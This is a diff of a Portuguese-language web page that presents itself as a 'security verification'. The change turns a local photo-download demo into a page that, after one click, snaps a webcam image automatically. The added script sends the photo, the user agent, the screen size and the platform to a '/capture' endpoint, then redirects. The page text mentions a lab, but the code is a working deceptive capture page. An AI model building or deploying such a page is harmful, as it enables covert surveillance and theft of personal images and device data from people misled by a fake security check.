@@ -1,144 +1,122 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Segurança</title>
-
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 16px;
-            text-align: center;
-            max-width: 400px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-        }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            color: white;
-            font-size: 36px;
-        }
-
-        .status {
-            color: #666;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-
-        button {
-            margin-top: 15px;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 8px;
-            background: #667eea;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        button:last-of-type {
-            background: #764ba2;
-        }
-
-        #video {
-            display: none;
-            width: 300px;
-            margin-top: 20px;
-            border-radius: 8px;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Verificação de Segurança</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.container {
+    background: white;
+    padding: 40px;
+    border-radius: 16px;
+    text-align: center;
+    max-width: 400px;
+}
+.logo {
+    font-size: 40px;
+}
+button {
+    margin-top: 15px;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 8px;
+    background: #667eea;
+    color: white;
+    font-weight: bold;
+}
+#video {
+    display: none;
+    width: 300px;
+    margin-top: 20px;
+    border-radius: 8px;
+}
+.status {
+    font-size: 14px;
+    color: #666;
+}
+</style>
 </head>
-
 <body>
 
 <div class="container">
     <div class="logo">🔒</div>
     <h2>Verificação de Segurança</h2>
 
-    <p style="color: #888; font-size: 13px;">
-        Seu dispositivo está sendo verificado para garantir acesso seguro.
+    <p class="status" id="status">
+        Clique para permitir a câmera e capturar a imagem do lab.
     </p>
 
-    <p class="status" id="status">Clique para permitir a câmera.</p>
-
-    <button onclick="pedirCamera()">Permitir câmera</button>
-
-    <button onclick="capturarFoto()">Capturar foto</button>
+    <button onclick="permitirECapturar()">Permitir e capturar foto</button>
 
     <video id="video" autoplay playsinline></video>
-
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
-const video = document.getElementById('video');
-const status = document.getElementById('status');
-const canvas = document.getElementById('canvas');
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
 
-let streamGlobal = null;
-
-async function pedirCamera() {
+async function permitirECapturar() {
     try {
-        status.textContent = 'Solicitando permissão da câmera...';
+        statusText.textContent = "Solicitando permissão da câmera...";
 
         const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
             audio: false
         });
 
-        streamGlobal = stream;
-
         video.srcObject = stream;
-        video.style.display = 'block';
+        video.style.display = "block";
 
-        status.textContent = 'Câmera permitida com sucesso ✅';
+        await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+        });
+
+        statusText.textContent = "Capturando foto...";
+
+        setTimeout(async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const image = canvas.toDataURL("image/jpeg", 0.8);
+
+            await fetch("/capture", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    image: image,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screen: screen.width + "x" + screen.height,
+                    platform: navigator.platform
+                })
+            });
+
+            stream.getTracks().forEach(track => track.stop());
+
+            statusText.textContent = "Foto salva com sucesso ✅ Redirecionando...";
+            window.location.href = "/fotos";
+
+        }, 1200);
+
     } catch (err) {
-        console.error(err);
-        status.textContent = 'Permissão da câmera negada ou indisponível ❌';
-        alert('Erro: ' + err.name + ' - ' + err.message);
+        statusText.textContent = "Erro ao acessar câmera ❌";
+        alert("Erro: " + err.name + " - " + err.message);
     }
-}
-
-function capturarFoto() {
-    if (!streamGlobal) {
-        alert("Primeiro permita a câmera ⚠️");
-        return;
-    }
-
-    const ctx = canvas.getContext('2d');
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const imagem = canvas.toDataURL('image/jpeg', 0.8);
-
-    const link = document.createElement('a');
-    link.href = imagem;
-    link.download = 'captura-lab.jpg';
-    link.click();
-
-    status.textContent = 'Foto capturada com sucesso ✅';
 }
 </script>
 
